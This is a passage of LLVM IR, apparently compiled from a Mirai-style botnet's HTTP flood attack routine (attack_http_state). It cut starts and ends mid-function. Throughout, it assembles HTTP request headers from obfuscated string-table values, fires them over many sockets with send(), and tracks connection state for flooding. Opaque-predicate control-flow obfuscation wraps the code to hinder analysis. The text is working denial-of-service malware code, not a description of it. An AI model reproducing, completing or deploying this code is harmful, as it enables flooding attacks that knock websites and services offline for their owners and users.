; <label>:784:                                    ; preds = %originalBBpart2140
  %785 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %786 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %785, i32 0, i32 0
  %787 = load i32, i32* %786, align 4
  %788 = add nsw i32 %787, 1
  store i32 %788, i32* %23, align 4
  br label %789

; <label>:789:                                    ; preds = %784, %originalBBpart2140
  br label %1310

; <label>:790:                                    ; preds = %originalBBpart283
  %791 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %792 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %791, i32 0, i32 1
  %793 = load i8, i8* %792, align 4
  %794 = zext i8 %793 to i32
  %795 = icmp eq i32 %794, 4
  br i1 %795, label %796, label %1102

; <label>:796:                                    ; preds = %790
  %797 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %798 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %797, i32 0, i32 14
  store i32 -1, i32* %798, align 4
  %799 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %800 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %799, i32 0, i32 11
  store i32 0, i32* %800, align 4
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 18
  %803 = getelementptr inbounds [1024 x i8], [1024 x i8]* %802, i32 0, i32 0
  call void @util_zero(i8* %803, i32 1024)
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 17
  store i32 0, i32* %805, align 4
  %806 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %806, i32 10240)
  %807 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %808 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %809 = call i32 @util_strlen(i8* %808)
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds i8, i8* %807, i64 %810
  %812 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %813 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %812, i32 0, i32 9
  %814 = getelementptr inbounds [9 x i8], [9 x i8]* %813, i32 0, i32 0
  %815 = call i32 @util_strcpy(i8* %811, i8* %814)
  %816 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %817 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %818 = call i32 @util_strlen(i8* %817)
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds i8, i8* %816, i64 %819
  %821 = call i32 @util_strcpy(i8* %820, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %822 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %823 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %824 = call i32 @util_strlen(i8* %823)
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds i8, i8* %822, i64 %825
  %827 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %827, i32 0, i32 6
  %829 = getelementptr inbounds [257 x i8], [257 x i8]* %828, i32 0, i32 0
  %830 = call i32 @util_strcpy(i8* %826, i8* %829)
  %831 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %832 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %833 = call i32 @util_strlen(i8* %832)
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds i8, i8* %831, i64 %834
  %836 = call i32 @util_strcpy(i8* %835, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %837 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %838 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %839 = call i32 @util_strlen(i8* %838)
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds i8, i8* %837, i64 %840
  %842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %842, i32 0, i32 5
  %844 = getelementptr inbounds [512 x i8], [512 x i8]* %843, i32 0, i32 0
  %845 = call i32 @util_strcpy(i8* %841, i8* %844)
  %846 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %847 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %848 = call i32 @util_strlen(i8* %847)
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds i8, i8* %846, i64 %849
  %851 = call i32 @util_strcpy(i8* %850, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %852 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %853 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %854 = call i32 @util_strlen(i8* %853)
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds i8, i8* %852, i64 %855
  %857 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %857, i32 0, i32 7
  %859 = getelementptr inbounds [129 x i8], [129 x i8]* %858, i32 0, i32 0
  %860 = call i32 @util_strcpy(i8* %856, i8* %859)
  %861 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %862 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %863 = call i32 @util_strlen(i8* %862)
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds i8, i8* %861, i64 %864
  %866 = call i32 @util_strcpy(i8* %865, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 48)
  %867 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %868 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %869 = call i32 @util_strlen(i8* %868)
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds i8, i8* %867, i64 %870
  %872 = call i8* @table_retrieve_val(i32 48, i32* null)
  %873 = call i32 @util_strcpy(i8* %871, i8* %872)
  call void @table_lock_val(i8 zeroext 48)
  %874 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %875 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %876 = call i32 @util_strlen(i8* %875)
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds i8, i8* %874, i64 %877
  %879 = call i32 @util_strcpy(i8* %878, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 49)
  %880 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %881 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %882 = call i32 @util_strlen(i8* %881)
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds i8, i8* %880, i64 %883
  %885 = call i8* @table_retrieve_val(i32 49, i32* null)
  %886 = call i32 @util_strcpy(i8* %884, i8* %885)
  call void @table_lock_val(i8 zeroext 49)
  %887 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %888 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %889 = call i32 @util_strlen(i8* %888)
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds i8, i8* %887, i64 %890
  %892 = call i32 @util_strcpy(i8* %891, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 50)
  %893 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %894 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %895 = call i32 @util_strlen(i8* %894)
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds i8, i8* %893, i64 %896
  %898 = call i8* @table_retrieve_val(i32 50, i32* null)
  %899 = call i32 @util_strcpy(i8* %897, i8* %898)
  call void @table_lock_val(i8 zeroext 50)
  %900 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %901 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %902 = call i32 @util_strlen(i8* %901)
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds i8, i8* %900, i64 %903
  %905 = call i32 @util_strcpy(i8* %904, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %906 = load i8*, i8** %14, align 8
  %907 = icmp ne i8* %906, null
  br i1 %907, label %908, label %949

; <label>:908:                                    ; preds = %796
  call void @table_unlock_val(i8 zeroext 51)
  %909 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %910 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %911 = call i32 @util_strlen(i8* %910)
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds i8, i8* %909, i64 %912
  %914 = call i8* @table_retrieve_val(i32 51, i32* null)
  %915 = call i32 @util_strcpy(i8* %913, i8* %914)
  call void @table_lock_val(i8 zeroext 51)
  %916 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %917 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %918 = call i32 @util_strlen(i8* %917)
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds i8, i8* %916, i64 %919
  %921 = call i32 @util_strcpy(i8* %920, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %922 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %923 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %924 = call i32 @util_strlen(i8* %923)
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds i8, i8* %922, i64 %925
  %927 = call i8* @table_retrieve_val(i32 56, i32* null)
  %928 = call i32 @util_strcpy(i8* %926, i8* %927)
  %929 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %930 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %931 = call i32 @util_strlen(i8* %930)
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds i8, i8* %929, i64 %932
  %934 = call i32 @util_strcpy(i8* %933, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %935 = load i8*, i8** %14, align 8
  %936 = call i32 @util_strlen(i8* %935)
  %937 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %938 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %939 = call i32 @util_strlen(i8* %938)
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds i8, i8* %937, i64 %940
  %942 = call i8* @util_itoa(i32 %936, i32 10, i8* %941)
  %943 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %944 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %945 = call i32 @util_strlen(i8* %944)
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds i8, i8* %943, i64 %946
  %948 = call i32 @util_strcpy(i8* %947, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %949

; <label>:949:                                    ; preds = %908, %796
  %950 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %951 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %950, i32 0, i32 15
  %952 = load i32, i32* %951, align 4
  %953 = icmp sgt i32 %952, 0
  br i1 %953, label %954, label %996

; <label>:954:                                    ; preds = %949
  %955 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %956 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %957 = call i32 @util_strlen(i8* %956)
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds i8, i8* %955, i64 %958
  %960 = call i32 @util_strcpy(i8* %959, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %961

; <label>:961:                                    ; preds = %986, %954
  %962 = load i32, i32* %10, align 4
  %963 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %963, i32 0, i32 15
  %965 = load i32, i32* %964, align 4
  %966 = icmp slt i32 %962, %965
  br i1 %966, label %967, label %989

; <label>:967:                                    ; preds = %961
  %968 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %969 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %970 = call i32 @util_strlen(i8* %969)
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds i8, i8* %968, i64 %971
  %973 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %973, i32 0, i32 16
  %975 = load i32, i32* %10, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %974, i64 0, i64 %976
  %978 = getelementptr inbounds [128 x i8], [128 x i8]* %977, i32 0, i32 0
  %979 = call i32 @util_strcpy(i8* %972, i8* %978)
  %980 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %981 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %982 = call i32 @util_strlen(i8* %981)
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds i8, i8* %980, i64 %983
  %985 = call i32 @util_strcpy(i8* %984, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %986

; <label>:986:                                    ; preds = %967
  %987 = load i32, i32* %10, align 4
  %988 = add nsw i32 %987, 1
  store i32 %988, i32* %10, align 4
  br label %961

; <label>:989:                                    ; preds = %961
  %990 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %991 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %992 = call i32 @util_strlen(i8* %991)
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds i8, i8* %990, i64 %993
  %995 = call i32 @util_strcpy(i8* %994, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %996

; <label>:996:                                    ; preds = %989, %949
  %997 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %998 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %999 = call i32 @util_strlen(i8* %998)
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds i8, i8* %997, i64 %1000
  %1002 = call i32 @util_strcpy(i8* %1001, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1003 = load i8*, i8** %14, align 8
  %1004 = icmp ne i8* %1003, null
  br i1 %1004, label %1005, label %1013

; <label>:1005:                                   ; preds = %996
  %1006 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1007 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1008 = call i32 @util_strlen(i8* %1007)
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds i8, i8* %1006, i64 %1009
  %1011 = load i8*, i8** %14, align 8
  %1012 = call i32 @util_strcpy(i8* %1010, i8* %1011)
  br label %1013

; <label>:1013:                                   ; preds = %1005, %996
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 9
  %1016 = getelementptr inbounds [9 x i8], [9 x i8]* %1015, i32 0, i32 0
  %1017 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1018 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1017, i32 0, i32 10
  %1019 = getelementptr inbounds [9 x i8], [9 x i8]* %1018, i32 0, i32 0
  %1020 = call signext i8 @util_strcmp(i8* %1016, i8* %1019)
  %1021 = icmp ne i8 %1020, 0
  br i1 %1021, label %1046, label %1022

; <label>:1022:                                   ; preds = %1013
  %1023 = load i32, i32* @x.17
  %1024 = load i32, i32* @y.18
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1022
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 9
  %1033 = getelementptr inbounds [9 x i8], [9 x i8]* %1032, i32 0, i32 0
  %1034 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1035 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1034, i32 0, i32 10
  %1036 = getelementptr inbounds [9 x i8], [9 x i8]* %1035, i32 0, i32 0
  %1037 = call i32 @util_strcpy(i8* %1033, i8* %1036)
  %1038 = load i32, i32* @x.17
  %1039 = load i32, i32* @y.18
  %1040 = sub i32 %1038, 1
  %1041 = mul i32 %1038, %1040
  %1042 = urem i32 %1041, 2
  %1043 = icmp eq i32 %1042, 0
  %1044 = icmp slt i32 %1039, 10
  %1045 = or i1 %1043, %1044
  br i1 %1045, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1046

; <label>:1046:                                   ; preds = %originalBBpart2144, %1013
  %1047 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1048 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1047, i32 0, i32 0
  %1049 = load i32, i32* %1048, align 4
  %1050 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1051 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1052 = call i32 @util_strlen(i8* %1051)
  %1053 = sext i32 %1052 to i64
  %1054 = call i64 @send(i32 %1049, i8* %1050, i64 %1053, i32 16384)
  %1055 = load i32, i32* %27, align 4
  %1056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1056, i32 0, i32 3
  store i32 %1055, i32* %1057, align 4
  %1058 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1059 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1058, i32 0, i32 1
  store i8 6, i8* %1059, align 4
  %1060 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1060, i32 0, i32 0
  %1062 = load i32, i32* %1061, align 4
  %1063 = srem i32 %1062, 64
  %1064 = zext i32 %1063 to i64
  %1065 = shl i64 1, %1064
  %1066 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1067 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1068 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1067, i32 0, i32 0
  %1069 = load i32, i32* %1068, align 4
  %1070 = sdiv i32 %1069, 64
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds [16 x i64], [16 x i64]* %1066, i64 0, i64 %1071
  %1073 = load i64, i64* %1072, align 8
  %1074 = or i64 %1073, %1065
  store i64 %1074, i64* %1072, align 8
  %1075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 4
  %1078 = load i32, i32* %23, align 4
  %1079 = icmp sgt i32 %1077, %1078
  br i1 %1079, label %1080, label %1101

; <label>:1080:                                   ; preds = %1046
  %1081 = load i32, i32* @x.17
  %1082 = load i32, i32* @y.18
  %1083 = sub i32 %1081, 1
  %1084 = mul i32 %1081, %1083
  %1085 = urem i32 %1084, 2
  %1086 = icmp eq i32 %1085, 0
  %1087 = icmp slt i32 %1082, 10
  %1088 = or i1 %1086, %1087
  br i1 %1088, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1080
  %1089 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1090 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1089, i32 0, i32 0
  %1091 = load i32, i32* %1090, align 4
  %1092 = add nsw i32 %1091, 1
  store i32 %1092, i32* %23, align 4
  %1093 = load i32, i32* @x.17
  %1094 = load i32, i32* @y.18
  %1095 = sub i32 %1093, 1
  %1096 = mul i32 %1093, %1095
  %1097 = urem i32 %1096, 2
  %1098 = icmp eq i32 %1097, 0
  %1099 = icmp slt i32 %1094, 10
  %1100 = or i1 %1098, %1099
  br i1 %1100, label %originalBBpart2157, label %originalBB146alteredBB

originalBBpart2157:                               ; preds = %originalBB146
  br label %1101

; <label>:1101:                                   ; preds = %originalBBpart2157, %1046
  br label %1309

; <label>:1102:                                   ; preds = %790
  %1103 = load i32, i32* @x.17
  %1104 = load i32, i32* @y.18
  %1105 = sub i32 %1103, 1
  %1106 = mul i32 %1103, %1105
  %1107 = urem i32 %1106, 2
  %1108 = icmp eq i32 %1107, 0
  %1109 = icmp slt i32 %1104, 10
  %1110 = or i1 %1108, %1109
  br i1 %1110, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %1102
  %1111 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1111, i32 0, i32 1
  %1113 = load i8, i8* %1112, align 4
  %1114 = zext i8 %1113 to i32
  %1115 = icmp eq i32 %1114, 6
  %1116 = load i32, i32* @x.17
  %1117 = load i32, i32* @y.18
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br i1 %1115, label %1124, label %1167

; <label>:1124:                                   ; preds = %originalBBpart2161
  %1125 = load i32, i32* @x.17
  %1126 = load i32, i32* @y.18
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1124
  %1133 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1134 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1133, i32 0, i32 0
  %1135 = load i32, i32* %1134, align 4
  %1136 = srem i32 %1135, 64
  %1137 = zext i32 %1136 to i64
  %1138 = shl i64 1, %1137
  %1139 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1140 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 4
  %1143 = sdiv i32 %1142, 64
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds [16 x i64], [16 x i64]* %1139, i64 0, i64 %1144
  %1146 = load i64, i64* %1145, align 8
  %1147 = or i64 %1146, %1138
  store i64 %1147, i64* %1145, align 8
  %1148 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1149 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1148, i32 0, i32 0
  %1150 = load i32, i32* %1149, align 4
  %1151 = load i32, i32* %23, align 4
  %1152 = icmp sgt i32 %1150, %1151
  %1153 = load i32, i32* @x.17
  %1154 = load i32, i32* @y.18
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBBpart2178, label %originalBB163alteredBB

originalBBpart2178:                               ; preds = %originalBB163
  br i1 %1152, label %1161, label %1166

; <label>:1161:                                   ; preds = %originalBBpart2178
  %1162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1162, i32 0, i32 0
  %1164 = load i32, i32* %1163, align 4
  %1165 = add nsw i32 %1164, 1
  store i32 %1165, i32* %23, align 4
  br label %1166

; <label>:1166:                                   ; preds = %1161, %originalBBpart2178
  br label %1308

; <label>:1167:                                   ; preds = %originalBBpart2161
  %1168 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1168, i32 0, i32 1
  %1170 = load i8, i8* %1169, align 4
  %1171 = zext i8 %1170 to i32
  %1172 = icmp eq i32 %1171, 7
  br i1 %1172, label %1173, label %1200

; <label>:1173:                                   ; preds = %1167
  %1174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 4
  %1177 = srem i32 %1176, 64
  %1178 = zext i32 %1177 to i64
  %1179 = shl i64 1, %1178
  %1180 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1181, i32 0, i32 0
  %1183 = load i32, i32* %1182, align 4
  %1184 = sdiv i32 %1183, 64
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds [16 x i64], [16 x i64]* %1180, i64 0, i64 %1185
  %1187 = load i64, i64* %1186, align 8
  %1188 = or i64 %1187, %1179
  store i64 %1188, i64* %1186, align 8
  %1189 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1189, i32 0, i32 0
  %1191 = load i32, i32* %1190, align 4
  %1192 = load i32, i32* %23, align 4
  %1193 = icmp sgt i32 %1191, %1192
  br i1 %1193, label %1194, label %1199

; <label>:1194:                                   ; preds = %1173
  %1195 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1195, i32 0, i32 0
  %1197 = load i32, i32* %1196, align 4
  %1198 = add nsw i32 %1197, 1
  store i32 %1198, i32* %23, align 4
  br label %1199

; <label>:1199:                                   ; preds = %1194, %1173
  br label %1291

; <label>:1200:                                   ; preds = %1167
  %1201 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1201, i32 0, i32 1
  %1203 = load i8, i8* %1202, align 4
  %1204 = zext i8 %1203 to i32
  %1205 = icmp eq i32 %1204, 10
  br i1 %1205, label %1206, label %1233

; <label>:1206:                                   ; preds = %1200
  %1207 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1207, i32 0, i32 0
  %1209 = load i32, i32* %1208, align 4
  %1210 = srem i32 %1209, 64
  %1211 = zext i32 %1210 to i64
  %1212 = shl i64 1, %1211
  %1213 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1214, i32 0, i32 0
  %1216 = load i32, i32* %1215, align 4
  %1217 = sdiv i32 %1216, 64
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds [16 x i64], [16 x i64]* %1213, i64 0, i64 %1218
  %1220 = load i64, i64* %1219, align 8
  %1221 = or i64 %1220, %1212
  store i64 %1221, i64* %1219, align 8
  %1222 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1222, i32 0, i32 0
  %1224 = load i32, i32* %1223, align 4
  %1225 = load i32, i32* %23, align 4
  %1226 = icmp sgt i32 %1224, %1225
  br i1 %1226, label %1227, label %1232

; <label>:1227:                                   ; preds = %1206
  %1228 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1228, i32 0, i32 0
  %1230 = load i32, i32* %1229, align 4
